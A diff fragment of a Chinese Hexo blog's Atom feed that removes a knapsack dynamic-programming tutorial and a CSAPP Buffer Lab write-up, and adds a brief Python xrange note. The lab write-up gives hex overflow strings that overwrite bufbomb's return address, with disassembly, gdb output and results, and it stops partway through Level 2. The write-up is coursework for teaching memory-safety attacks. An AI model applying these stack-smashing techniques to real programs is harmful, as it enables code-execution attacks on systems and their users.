+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; c = xrange(1,100)</div><div class="line">&gt;&gt;&gt; print type(c)</div><div class="line">&lt;type &apos;xrange&apos;&gt;</div><div class="line">&gt;&gt;&gt; print c</div><div class="line">xrange(1, 100)</div><div class="line">&gt;&gt;&gt; print c[1],c[2]</div><div class="line">2 3</div></pre></td></tr></table></figure>
+<p>由上面的示例可以知道：要生成很大的数字序列的时候，用xrange会比range性能优很多，因为不需要一上来就开辟一块很大的内存空间，这两个基本上都是在循环的时候用，可以说是延迟执行的。</p>
+<p>range会直接生成一个list对象,而xrange则不会直接生成一个list，而是每次调用返回其中的一个值。所以xrange做循环的性能比range好，尤其是返回很大的时候，尽量用xrange吧，除非你是要返回一个列表。</p>
 ]]></content>
     
     <summary type="html">
@@ -2031,208 +2309,6 @@ OVER (
     
     
       <category term="数据库" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>计算机算法|动态规划之背包问题</title>
-    <link href="http://yoursite.com/2018/05/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B9%8B0-1%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"/>
-    <id>http://yoursite.com/2018/05/13/计算机算法-动态规划之0-1背包问题/</id>
-    <published>2018-05-12T17:26:51.000Z</published>
-    <updated>2018-05-18T16:33:17.187Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="0-1背包问题"><a href="#0-1背包问题" class="headerlink" title="0-1背包问题"></a>0-1背包问题</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>有 N 件物品和一个容量为 V 的背包。第 i 件物品的费用是 c[i]，价值是 w[i]。求解将哪些<br>物品装入背包可使这些物品的费用总和不超过背包容量，且价值总和最大。</p>
-<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>这是最基础的背包问题，特点是：<strong>每种物品仅有一件，可以选择放或不放。</strong></p>
-<p>用子问题定义状态：<strong>即 f[i][v]表示前 i 件物品恰放入一个容量为 v 的背包可以获得的最大<br>价值。</strong>则其状态转移方程便是：<code>f[i][v]=max{f[i-1][v],f[i-1][v-c[i]]+w[i]}</code>。</p>
-<p>这个方程非常重要，基本上所有跟背包相关的问题的方程都是由它衍生出来的。所以有必要将它详细解释一下：<code>将前 i 件物品放入容量为 v 的背包中</code>这个子问题，若只考虑第 i 件物品的策略（放或不放），那么就可以<strong>转化为一个只牵扯前 i-1 件物品的问题</strong>。</p>
-<ul>
-<li><p>如果不放第 i 件物品，那么问题就转化为“前 i-1 件物品放入容量为 v 的背包中”；</p>
-</li>
-<li><p>如果放第 i 件物品，那么问题就转化为“前 i-1 件物品放入剩下的容量为 <code>v-c[i]</code>的背包中”，此时能获得的最大价值就是 <code>f[i-1][v-c[i]]</code>再加上通过放入第 i 件物品获得的价值 <code>w[i]</code>。</p>
-</li>
-</ul>
-<p>来段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">for (int i=1;i&lt;=n;++i) &#123;　for (int j=v;j&gt;=0;--j)　　 &#123;</div><div class="line">       if(c[i]&lt;=j)//如果当前物品可以放入当前空间的背包</div><div class="line">       f[i][j]=max(f[i-1][j],f[i-1][j-c[i]]+w[i]);</div><div class="line">       else f[i][j]=f[i-1][j];//如果当前物品放不进去，那么继承前i个物品在当前空间大小时的价值</div><div class="line">　　　&#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
-<h4 id="优化空间复杂度"><a href="#优化空间复杂度" class="headerlink" title="优化空间复杂度"></a>优化空间复杂度</h4><p>从上面计算f[i][j]可以看出，在计算f[i][j]时只使用了f[i-1][0……j]，所以说并没有使用其他子问题，所以说在存储子问题解的时候，只用存储f[i-1]的子问题解即可；所以说可以用一个一维数组替换掉那个二维数组，一个存储子问题，一个存储正在解决的子问题。</p>
-<p>那么，如果只用一个数组<code>f [0..V]</code>，能不能保证第 i 次循环结束后<code>f[v]</code>中表示的就是我们定义的状态 <code>f[i][v]</code>呢？<code>f[i][v]</code>是由 <code>f[i-1][v]</code>和 <code>f[i-1] [v-c[i]]</code>两个子问题递推而来，能否保证在推 <code>f[i][v]</code>时（也即在第 i 次主循环中推 f[v]时）能够得到 f[i-1][v]和 f[i-1][v -c[i]]的值呢？<strong>事实上，这要求在每次主循环中我们以 v=V..0 的顺序推 f[v]，这样才能保证推 f[v]时 f[v-c[i]]保存的是状态 f[i -1][v-c[i]]的值。</strong></p>
-<p>伪代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for i=1..N</div><div class="line">  for v=V..0</div><div class="line">	f[v]=max&#123;f[v],f[v-c[i]]+w[i]&#125;;</div></pre></td></tr></table></figure></p>
-<p>下面张图解释这一切：</p>
-<p><img src="/images/计算机算法-背包问题-01.png" alt="0-1背包|一维数组"></p>
-<h3 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>在n种物品中选取若干件（同一种物品可多次选取）放在空间为v的背包里，每种物品的体积为c1，c2，…，cn，与之相对应的价值为w1,w2，…，wn.求解怎么装物品可使背包里物品总价值最大。</p>
-<p>不难发现<code>完全背包问题</code>与<code>0-1背包问题</code>的区别在于完全背包每一件物品的数量都有无限个，而01背包每件物品数量只有1个。所以说与它相关的策略已经不是只有取和不取这两种策略了，而是有取0件、取1件、取2件……等等很多种策略。</p>
-<p>如果我们用和01背包一样的状态，f[i][v]表示前i种物品恰放入一个容量为v的背包的最大价值，那我们应该用k表示当前容量下可以装第i种物品的件数，那么k的范围应该是<code>0≤k≤v/c[i]</code>。既然要用当前物品i把当前容量装满，那需要<code>0≤k≤v/c[i]</code>件，其中k表示件数。</p>
-<p>下面给出状态转移方程：<code>f[i][j] = max{f[i-1][v],f[i-1][v - k * c[i]] + k * w[i]}(0&lt;=k*c[i]&lt;=v)</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">for (int i = 1; i &lt; n; i++)&#123;</div><div class="line">   for (int j = 1; j &lt;= v; j++)&#123;</div><div class="line">     for (int k = 0; k*c[i] &lt;= j; k++)&#123;</div><div class="line">        if(c[i]&lt;=j)/*如果能放下*/</div><div class="line">            f[i][j] = max&#123;f[i-1][j],f[i-1][j - k * c[i]] + k * w[i]&#125;;/*要么不取，要么取0件、取1件、取2件……取k件*/</div><div class="line">        else/*放不下的话*/</div><div class="line">            f[i][j]=f[i-1][j]/*继承前i个物品在当前空间大小时的价值*/</div><div class="line">     &#125;</div><div class="line">  &#125;   </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>画一个v=6，c[1]=1 , w[1]=3 ; c[2]=3 , w[2]=10的表格:</p>
-<p><img src="/images/计算机算法-背包问题-05.png" alt="完全背包"></p>
-<h4 id="转化为-01-背包问题求解"><a href="#转化为-01-背包问题求解" class="headerlink" title="转化为 01 背包问题求解"></a>转化为 01 背包问题求解</h4><p>既然 01 背包问题是最基本的背包问题，那么我们可以<strong>考虑把完全背包问题转化为0-1背包问题来解</strong>。改变一下dp思路，让f[i][j]表示出在前i种物品中选取若干件物品放入容量为j的背包所得的最大价值。</p>
-<p>所以说，对于第i件物品有放或不放两种情况，而放的情况里又分为放1件、2件、……v/c[i]件</p>
-<p>如果不放那么<code>f[i][j]=f[i-1][j]</code>；如果确定放，那么当前背包中应该出现至少一件第i种物品，所以f[i][j]中至少应该出现一件第i种物品,即<code>f[i][j]=f[i][j-c[i]]+w[i]</code>，为什么会是f[i][j-c[i]]+w[i]？</p>
-<p>因为我们要把当前物品i放入包内，因为物品i可以无限使用，所以要用<code>f[i][j-c[i]]</code>；如果我们用的是<code>f[i-1][j-c[i]]</code>，<code>f[i-1][j-c[i]]</code>的意思是说，我们只有一件当前物品i，所以我们在放入物品i的时候需要考虑到第i-1个物品的价值<code>(f[i-1][j-c[i]])</code>；但是现在我们有无限件当前物品i，我们不用再考虑第i-1个物品了，我们所要考虑的是在当前容量下是否再装入一个物品i，而<code>[j-c[i]]</code>的意思是指要确保<code>f[i][j]</code>至少有一件第i件物品，所以要预留c[i]的空间来存放一件第i种物品。<strong>总而言之，如果放当前物品i的话，它的状态就是它自己”i”，而不是上一个”i-1”</strong>。</p>
-<p>所以说状态转移方程为：<code>f[i][j]=max(f[i-1][j],f[i][j-c[i]]+w[i])</code>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">for(int i = 0 ; i &lt; n ; i ++) </div><div class="line">&#123; </div><div class="line">    for(int j = 1 ; j &lt;= v ; j++) </div><div class="line">    &#123;</div><div class="line">        if(c[i]&lt;=j)</div><div class="line">        f[i][j] = max(f[i-1][j],f[i][j-c[i]]+w[i]); </div><div class="line">        else</div><div class="line">        f[i][j]=f[i-1][j];</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;0-1背包问题&quot;&gt;&lt;a href=&quot;#0-1背包问题&quot; class=&quot;headerlink&quot; title=&quot;0-1背包问题&quot;&gt;&lt;/a&gt;0-1背包问题&lt;/h3&gt;&lt;h4 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题
-    
-    </summary>
-    
-      <category term="计算机算法" scheme="http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
-    
-    
-      <category term="计算机算法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>深入理解计算机系统|CSAPP-Bufferlab</title>
-    <link href="http://yoursite.com/2018/05/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-CSAPP-Bufferlab/"/>
-    <id>http://yoursite.com/2018/05/12/深入理解计算机系统-CSAPP-Bufferlab/</id>
-    <published>2018-05-11T20:29:36.000Z</published>
-    <updated>2018-05-27T08:18:52.246Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用<code>缓冲区溢出漏洞</code>生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
-<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
-<li>IA32的栈帧结构，可参考：<a href="http://wuduozhi.me/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-5/" target="_blank" rel="external">深入理解计算机系统|汇编的世界-5</a></li>
-<li>gdb调试，可参考：<a href="http://wuduozhi.me/2018/03/27/%E5%B7%A5%E5%85%B7-gdb%E8%B0%83%E8%AF%95/" target="_blank" rel="external">工具|gdb调试</a></li>
-</ul>
-<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>实验讲义中主要包含了以下3个可执行文件：</p>
-<ul>
-<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
-<li>makecookie 根据你所输入的userid生成一个cookie</li>
-<li>hex2raw 一个生成攻击字符串的工具</li>
-</ul>
-<p>值得注意的是，<code>bufbomb</code>接受如下的参数：</p>
-<ul>
-<li>-h 打印帮助信息</li>
-<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
-<li>-n 进入’Nitro’模式，在阶段4中使用</li>
-<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
-</ul>
-<p>首先我们要输入userid生成一个cookie供后续使用，我这里使用uesrud为<code>xzz</code>。命令及结果如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie xzz &gt; cookie   </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie   </div><div class="line">0x52f8c747</div></pre></td></tr></table></figure>
-<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令如下：<code>objdump -d bufbomb &gt; bufbomb.s</code> 。</p>
-<p>目标程序的通过<code>getbuf</code>函数从标准输入流中读取字符串，该函数具有缓冲区溢出的漏洞，我们的实验都是通过这个函数的漏洞展开的。</p>
-<p><code>getbuf</code>函数：</p>
-<pre><code>/ * Buffer size for getbuf* /
-#define NORMAL_BUFFER_SIZE 32
-
-int getbuf()
-{
-    char buf[NORMAL_BUFFER_SIZE];
-    Gets(buf);
-    return 1;
-}
-</code></pre><p><code>getbuf</code>函数的反汇编格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">08048c04 &lt;getbuf&gt;:</div><div class="line"> 8048c04:	55                   	push   %ebp</div><div class="line"> 8048c05:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c07:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 8048c0d:	89 04 24             	mov    %eax,(%esp) &lt;-- $eax保存输入字符串存放的地址, 由栈来传递给Gets函数</div><div class="line"> 8048c10:	e8 35 ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048c15:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c1a:	c9                   	leave  </div><div class="line"> 8048c1b:	c3                   	ret</div></pre></td></tr></table></figure></p>
-<p>注意到函数总共开辟了<code>0x38=56</code>个字节的栈空间，然后<code>lea -0x28(%ebp),%eax</code>和<code>mov %eax,(%esp)</code>进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而<code>ebp</code>指向栈底，我们可以推测缓冲区总共是0x28=40个字节。所以能得到<code>getbuf</code>函数的栈帧如下图：</p>
-<p><img src="/images/CSAPP-BufferLab-01.png" alt="getbuf栈帧"></p>
-<p>那么所谓的缓冲区溢出也就是破坏<code>buf</code>到返回地址的内存空间，把需要跳转的地址通过溢出填入到返回地址中，改变程序的执行顺序。</p>
-<h3 id="开始攻关"><a href="#开始攻关" class="headerlink" title="开始攻关"></a>开始攻关</h3><h4 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0 Candle"></a>Level 0 Candle</h4><p>The function getbuf is called within BUFBOMB by a function test having the following C code:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/* test */</div><div class="line">void test()</div><div class="line">&#123;</div><div class="line">    int val;</div><div class="line">    /* Put canary on stack to detect possible corruption */</div><div class="line">    volatile int local = uniqueval();</div><div class="line">    val = getbuf();</div><div class="line">    /* Check for corrupted stack */</div><div class="line">    if (local != uniqueval()) &#123;</div><div class="line">	    printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;);</div><div class="line">    &#125;else if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Boom!: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    	validate(3);</div><div class="line">    &#125; else &#123;</div><div class="line">    	printf(&quot;Dud: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void smoke()</div><div class="line">&#123;</div><div class="line">    printf(&quot;Smoke!: You called smoke()\n&quot;);</div><div class="line">    validate(0);</div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。通过反汇编得到smoke的汇编代码，可以得到smoke的起始地址<code>080490ba</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080490ba &lt;smoke&gt;:</div><div class="line"> 80490ba:	55                   	push   %ebp</div><div class="line"> 80490bb:	89 e5                	mov    %esp,%ebp</div><div class="line"> 80490bd:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 80490c0:	c7 04 24 b5 9f 04 08 	movl   $0x8049fb5,(%esp)</div><div class="line"> 80490c7:	e8 74 f8 ff ff       	call   8048940 &lt;puts@plt&gt;</div><div class="line"> 80490cc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490d3:	e8 0c 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 80490d8:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490df:	e8 ac f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
-<p>根据以上的信息，我们的攻击代码 level0.txt 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 ba 90 04 08 /* 保存的%ebp以及返回地址 注意是小端机器*/</div></pre></td></tr></table></figure></p>
-<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level0.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Smoke!: You called smoke()</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
-<h4 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1 Sparkler"></a>Level 1 Sparkler</h4><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">void fizz(int val)</div><div class="line">&#123;</div><div class="line">    if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Fizz!: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    	validate(1);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    </div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0804906f &lt;fizz&gt;:</div><div class="line"> 804906f:	55                   	push   %ebp</div><div class="line"> 8049070:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049072:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049075:	8b 45 08             	mov    0x8(%ebp),%eax</div><div class="line"> 8049078:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 804907e:	75 1e                	jne    804909e &lt;fizz+0x2f&gt;</div><div class="line"> 8049080:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049084:	c7 04 24 97 9f 04 08 	movl   $0x8049f97,(%esp)</div><div class="line"> 804908b:	e8 50 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049090:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</div><div class="line"> 8049097:	e8 48 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 804909c:	eb 10                	jmp    80490ae &lt;fizz+0x3f&gt;</div><div class="line"> 804909e:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 80490a2:	c7 04 24 b8 a1 04 08 	movl   $0x804a1b8,(%esp)</div><div class="line"> 80490a9:	e8 32 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 80490ae:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490b5:	e8 d6 f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
-<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数<code>fizz</code>的起始地址为<code>0804906f</code>，<code>val</code>保存在<code>0x8(%ebp)</code>中，cookie保存在固定的地址<code>0x804c1e4</code>中。根据以上的信息，我们的攻击代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 6f 90 04 08 /* 保存的%ebp以及返回地址 */</div><div class="line">00 00 00 00 47 c7 f8 52 /* cookie */</div></pre></td></tr></table></figure>
-<p>注意到，从<code>getbuf</code>返回的时候，内存是这样的一个状态：</p>
-<p><img src="/images/CSAPP-BufferLab-02.png" alt="level-01"></p>
-<p>此时，已经跳转到 <code>fizz</code>函数哪里了，但现在的<code>%ebp</code>的值是<code>0x00000000</code>,不过幸好有<code>mov    %esp,%ebp</code>这条指令，把<code>%ebp</code>拯救回来，才能使<code>mov    0x8(%ebp),%eax</code>能得到我们放入的cookie。这时的内存状态是这样的：</p>
-<p><img src="/images/CSAPP-BufferLab-03.png" alt="level-01"></p>
-<p>执行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level1.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Fizz!: You called fizz(0x52f8c747)</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
-<h4 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2 Firecracker"></a>Level 2 Firecracker</h4><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int global_value = 0;</div><div class="line">void bang(int val)</div><div class="line">&#123;</div><div class="line">    if (global_value == cookie) &#123;</div><div class="line">	    printf(&quot;Bang!: You set global_value to 0x%x\n&quot;, global_value);</div><div class="line">    	validate(2);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: global_value = 0x%x\n&quot;, global_value);</div><div class="line"></div><div class="line">	exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。那怎么设置呢？<strong>在栈上构建一段代码，然后在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang</strong>。</p>
-<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) break getbuf</div><div class="line">Breakpoint 1 at 0x8048c0a</div><div class="line">(gdb) run -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048c0a in getbuf ()</div><div class="line">(gdb) disas getbuf</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x08048c04 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048c05 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048c07 &lt;+3&gt;:	sub    $0x38,%esp</div><div class="line">=&gt; 0x08048c0a &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x08048c0d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048c10 &lt;+12&gt;:	call   0x8048b4a &lt;Gets&gt;</div><div class="line">   0x08048c15 &lt;+17&gt;:	mov    $0x1,%eax</div><div class="line">   0x08048c1a &lt;+22&gt;:	leave  </div><div class="line">   0x08048c1b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) print /x $ebp</div><div class="line">$1 = 0x55683450</div><div class="line">(gdb) print /x $esp</div><div class="line">$2 = 0x55683418</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
